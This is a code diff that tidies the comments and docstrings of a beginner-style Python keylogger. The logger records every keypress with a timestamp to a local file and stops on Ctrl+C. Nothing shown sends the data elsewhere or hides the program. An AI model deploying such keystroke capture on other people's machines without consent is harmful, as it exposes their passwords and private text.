@@ -1,21 +1,18 @@
 # Import required libraries
 from pynput import keyboard      # For detecting keyboard presses
 import threading                 # For running tasks in parallel
-import signal                   # For handling program shutdown signals
-import sys                      # For system-related functions
-from datetime import datetime   # For adding timestamps
-import os                      # For file and path operations
+import signal                    # For handling program shutdown signals
+import sys                       # For system-related functions
+from datetime import datetime    # For adding timestamps
+import os                        # For file and path operations
 
 class KeyLogger:
-    """
-    A class that handles keyboard logging operations.
-    """
+    # A class that handles keyboard logging operations.
     
     def __init__(self, filename="keyfile.txt"):
-        """
-        This is like setting up a new notebook to write in.
-        It runs when we first create our keylogger.
-        """
+        # This is like setting up a new notebook to write in.
+        # It runs when we first create our keylogger.
+        
         # Name of the file where we'll save the keys
         self.filename = filename
         
@@ -26,16 +23,24 @@ class KeyLogger:
         self.stop_event = threading.Event()
         
     def timestamp(self):
-         """
-         Creates a timestamp 
-        """
+        # Creates a timestamp
         return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
     def key_pressed(self, key):
-        """
-        This function runs every time a key is pressed.
-        It's like having someone watch the keyboard and write down every key you press.
-        """
+        # Handles the event triggered when a key is pressed.
+        # This method logs the pressed key along with a timestamp to a specified file.
+        # It differentiates between normal keys (e.g., letters, numbers) and special keys
+        # (e.g., Shift, Ctrl) and writes the appropriate information to the log file.
+
+        # Args:
+        #     key: The key object representing the key that was pressed.
+
+        # Returns:
+        #     bool: Returns True to continue listening for key presses unless the stop event is set.
+
+        # Exceptions:
+        #     If an error occurs during the logging process, it prints an error message
+        #     describing the issue.
         try:
             # Open our file (like opening a notebook)
             # 'with' makes sure we close the file properly when we're done
@@ -60,23 +65,19 @@ class KeyLogger:
         return not self.stop_event.is_set()
 
     def signal_handler(self, signum, frame):
-        """
-        This is like having an emergency stop button.
-        When someone presses Ctrl+C, this function catches it and stops safely.
-        """
+        # This is like having an emergency stop button.
+        # When someone presses Ctrl+C, this function catches it and stops safely.
         print("\nSomeone pressed Ctrl+C! Stopping the program...")
         self.stop()
 
     def stop(self):
-        """
-        This is our shutdown procedure.
-        """
+        # This is our shutdown procedure.
+        
         # Tell the program it's time to stop
         self.stop_event.set()
         self.running = False
         
     def start(self):
-       
         # Set up our emergency stop button (Ctrl+C handler)
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
